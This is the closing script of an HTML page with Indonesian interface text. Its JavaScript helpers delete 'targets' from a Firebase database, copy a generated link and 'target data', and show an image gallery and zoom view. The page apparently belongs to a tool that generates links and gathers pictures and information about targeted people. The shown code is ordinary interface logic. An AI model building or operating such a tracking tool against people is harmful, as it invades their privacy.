    function delT(id) { if(confirm('Hapus target?')) db.ref(`users/${localStorage.getItem('current_user')}/targets/${id}`).remove(); }
    function logout() { localStorage.clear(); location.reload(); }
    function toggleNav() { document.getElementById('side-nav').classList.toggle('active'); document.getElementById('navOver').style.display = (document.getElementById('side-nav').classList.contains('active')) ? 'block' : 'none'; }
    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
    function closeFolder() { document.getElementById('gallery-overlay').style.display = 'none'; }
    function openZoom(s) { document.getElementById('zoomed-img').src = s; document.getElementById('image-zoom-overlay').style.display = 'flex'; }
    function copyLinkOnly() { const e = document.getElementById('gen-url'); e.select(); document.execCommand('copy'); alert('Link Disalin!'); }
    function toggleGuide() { document.getElementById('guide-body').classList.toggle('open'); }
    function copyTargetText() {
        const info = document.getElementById('info-container').innerText;
        navigator.clipboard.writeText(info).then(() => alert('Data Target Disalin!'));
    }
</script>
</body>
</html>
